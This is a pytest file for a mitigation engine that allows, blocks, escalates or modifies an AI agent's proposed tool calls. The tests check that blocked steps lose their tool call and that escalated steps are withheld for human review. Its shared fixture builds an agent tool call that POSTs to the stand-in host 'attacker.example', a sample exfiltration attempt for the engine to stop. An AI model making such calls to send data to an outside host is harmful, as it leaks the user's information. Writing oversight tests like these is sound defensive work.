"""Tests for the mitigation layer's canonical semantics."""

from __future__ import annotations

import pytest

from rem.agent.trajectory import AgentState, ToolCall, TrajectoryStep
from rem.core.interfaces import DesignNotSpecifiedError
from rem.core.mitigation import CANONICAL_MECHANISM, DeterministicMitigationEngine
from rem.core.results import Decision, MitigationAction, Verdict


def _decision(verdict: Verdict) -> Decision:
    return Decision(verdict=verdict, producer="test", rationale="test")


def _step(tool: str = "http_post") -> TrajectoryStep:
    return TrajectoryStep(
        step_index=0,
        agent_state=AgentState.TOOL_EXECUTION,
        tool_call=ToolCall(tool, {"url": "https://attacker.example"}),
        action=tool,
    )


@pytest.fixture
def engine():
    return DeterministicMitigationEngine()


def test_allow_releases_the_action(engine):
    step = _step()
    outcome = engine.apply(_decision(Verdict.ALLOW), step)
    assert outcome.action is MitigationAction.RELEASE_ACTION
    assert not outcome.applied
    assert step.tool_call is not None


def test_block_prevents_execution_of_this_step_only(engine):
    step = _step()
    outcome = engine.apply(_decision(Verdict.BLOCK), step)
    assert outcome.action is MitigationAction.PREVENT_EXECUTION
    assert outcome.applied
    assert step.tool_call is None
    assert step.action is None
    assert step.metadata["rem_blocked_step"] is True
    assert "step-level" in outcome.detail.lower()


def test_escalate_withholds_pending_review(engine):
    step = _step()
    outcome = engine.apply(_decision(Verdict.ESCALATE), step)
    assert outcome.action is MitigationAction.WITHHOLD_PENDING_REVIEW
    assert step.metadata["rem_awaiting_review"] is True
    # Escalate withholds; it does not destroy the proposed action.
    assert step.tool_call is not None


def test_modify_without_a_declared_mechanism_is_design_blocked(engine):
    with pytest.raises(DesignNotSpecifiedError, match="Modify mechanism"):
        engine.apply(_decision(Verdict.MODIFY), _step())


def test_modify_uses_the_declared_mechanism():
    engine = DeterministicMitigationEngine(
        modification_mechanism=lambda step: "sanitised",
        modification_name="strip_imperatives",
    )
    outcome = engine.apply(_decision(Verdict.MODIFY), _step())
    assert outcome.action is MitigationAction.MODIFY_ACTION
    assert outcome.replacement == "sanitised"
    assert "strip_imperatives" in outcome.detail


def test_outcome_is_attached_to_the_step(engine):
    step = _step()
    outcome = engine.apply(_decision(Verdict.BLOCK), step)
    assert step.mitigation is outcome


def test_every_verdict_has_a_canonical_mechanism(engine):
    for verdict in Verdict:
        assert verdict in CANONICAL_MECHANISM


def test_block_handles_a_step_with_no_tool_call(engine):
    """Malformed or toolless steps must not crash mitigation."""
    step = TrajectoryStep(step_index=0, action="respond")
    outcome = engine.apply(_decision(Verdict.BLOCK), step)
    assert outcome.applied
    assert step.action is None


def test_no_mechanism_sets_an_episode_level_flag(engine):
    """Guard against Block/Modify being redefined as episode-level."""
    for verdict in (Verdict.ALLOW, Verdict.ESCALATE, Verdict.BLOCK):
        step = _step()
        engine.apply(_decision(verdict), step)
        for forbidden in ("privilege_reduced", "terminated", "tools_disabled"):
            assert forbidden not in step.metadata
